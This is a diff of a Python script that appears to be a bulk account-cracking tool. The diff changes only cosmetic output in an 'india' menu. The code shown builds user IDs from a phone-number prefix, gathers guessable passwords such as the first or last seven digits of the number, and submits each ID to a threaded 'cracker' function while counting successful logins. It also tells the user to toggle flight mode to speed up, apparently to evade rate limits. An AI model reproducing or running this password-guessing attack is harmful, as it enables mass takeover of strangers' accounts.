@@ -523,9 +523,9 @@ def bd():
 #__________________| INDIA |__________________#
 def india():
     clear()
-    print(f" {wow('â¢')} ENTER NUMBER WITH COUNTRY CODE ")
-    print(f" {wow('â¢')} EXAMPLE : {green}9351048348 ")
-    divider()
+    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] ENTER NUMBER WITH COUNTRY CODE ")
+    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : {green}9351048348 ")
+    linex()
     number = input(f" {wow('-')} ENTER NUMBER : {green}")
     limit = int(input(f" {wow('-')} ENTER LIMIT  : {green}"))
     code = number[:4]
@@ -541,7 +541,7 @@ def india():
     print(f" {wow('â¢')} EXAMPLE : {green}first7, last7 ")
     print(f" {wow('â¢')} EXAMPLE : {green}khankhan, 57273200 ")
     print(f" {wow('â¢')} EXAMPLE : {green}fullnumber ")
-    divider()
+    linex()
     for p in range(pw_limit):
         p_ask = input(f" {wow(p+1)} ENTER PASSWORD : {green}")
         pwx.append(p_ask)
@@ -551,11 +551,11 @@ def india():
         print(f" {wow('-')} TOTAL ACCOUNTS  : {green}{tl} ")
         print(f" {wow('-')} SELECTED NUMBER : {green}{number} ")
         print(f" {wow('!')} {white}USE FLIGHT MODE FOR SPEED UP ")
-        divider()
+        linex()
         for user in xnxx:
             uid = code+user
             Xnxx.submit(cracker, uid, pwx, tl)
-    divider()
+    linex()
     print(f" {wow('!')} {green}PROCESS COMPLETED ")
     print(f" {wow('â¢')} {green}TOTAL OK : {str(len(oks))} ")
     divider()
